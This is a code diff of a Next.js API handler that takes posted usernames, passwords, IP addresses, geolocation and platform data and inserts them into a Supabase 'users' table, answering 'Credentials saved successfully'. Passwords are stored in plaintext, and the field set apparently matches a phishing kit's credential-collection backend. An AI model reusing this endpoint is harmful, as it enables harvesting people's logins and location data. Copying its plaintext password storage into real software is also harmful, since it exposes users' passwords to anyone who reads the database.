@@ -1,31 +1,53 @@
 import { createClient } from '@supabase/supabase-js'
 
-// Initialize Supabase client
-const supabase = createClient(
-  process.env.NEXT_PUBLIC_SUPABASE_URL,
-  process.env.SUPABASE_SERVICE_ROLE_KEY
-)
-
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
   try {
-    const { username, password, country, city, continent, ip_address } = req.body;
+    const { username, password, country, city, continent, ip_address, platform } = req.body;
     
-    // Insert data into Supabase
+    // Initialize Supabase client
+    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
+    const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
+    const supabase = createClient(supabaseUrl, supabaseAnonKey);
+    
+    // Insert data into the users table
     const { data, error } = await supabase
       .from('users')
       .insert([
-        { username, password, country, city, continent, ip_address }
+        { 
+          username, 
+          password,
+          country,
+          city, 
+          continent,
+          ip_address,
+          platform,
+          login_time: new Date().toISOString()
+        }
       ]);
     
-    if (error) throw error;
+    if (error) {
+      console.error('Supabase error:', error);
+      return res.status(500).json({ 
+        error: error.message,
+        success: false
+      });
+    }
     
-    return res.status(200).json({ success: true });
+    return res.status(200).json({ 
+      success: true,
+      message: 'Credentials saved successfully',
+      data
+    });
+    
   } catch (error) {
-    console.error('Database error:', error);
-    return res.status(500).json({ error: error.message });
+    console.error('Server error:', error);
+    return res.status(500).json({ 
+      error: error.message,
+      success: false
+    });
   }
 } 
